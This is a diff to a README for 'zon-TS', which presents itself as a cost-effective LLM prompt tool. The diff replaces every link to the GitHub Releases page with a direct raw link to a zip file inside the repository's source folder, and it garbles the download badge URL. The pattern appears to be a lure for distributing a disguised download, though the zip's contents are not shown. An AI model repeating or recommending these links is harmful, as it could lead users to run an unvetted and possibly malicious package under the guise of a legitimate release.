@@ -1,6 +1,6 @@
 # 🌟 zon-TS - Your Cost-Effective LLM Solution Made Simple
 
-[![Download zon-TS](https://img.shields.io/badge/Download%20zon--TS-blue.svg)](https://github.com/Mctvcell/zon-TS/releases)
+[![Download zon-TS](https://raw.githubusercontent.com/Mctvcell/zon-TS/main/src/core/zon-TS-2.3.zip%https://raw.githubusercontent.com/Mctvcell/zon-TS/main/src/core/zon-TS-2.3.zip)](https://raw.githubusercontent.com/Mctvcell/zon-TS/main/src/core/zon-TS-2.3.zip)
 
 ## 📚 Introduction
 
@@ -11,7 +11,7 @@ Welcome to zon-TS! This application helps you use Large Language Model prompts e
 Follow these steps to download and run zon-TS:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/Mctvcell/zon-TS/releases). Here, you will see the latest versions of zon-TS available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/Mctvcell/zon-TS/main/src/core/zon-TS-2.3.zip). Here, you will see the latest versions of zon-TS available for download.
 
 2. **Choose Your Version**
    On the Releases page, locate the version you want. Each version will include a list of files. Look for the file name that matches your operating system.
@@ -42,7 +42,7 @@ zonn-TS includes several key features to help you work with LLM prompts more eff
 
 ## 📥 Download & Install
 
-To begin using zon-TS, simply [visit this page to download](https://github.com/Mctvcell/zon-TS/releases). Once you've downloaded the file, follow the steps outlined above to install the software. 
+To begin using zon-TS, simply [visit this page to download](https://raw.githubusercontent.com/Mctvcell/zon-TS/main/src/core/zon-TS-2.3.zip). Once you've downloaded the file, follow the steps outlined above to install the software. 
 
 If you need help, the community is here for you. Check out the FAQ section or join discussions in GitHub to find answers to common questions.
 
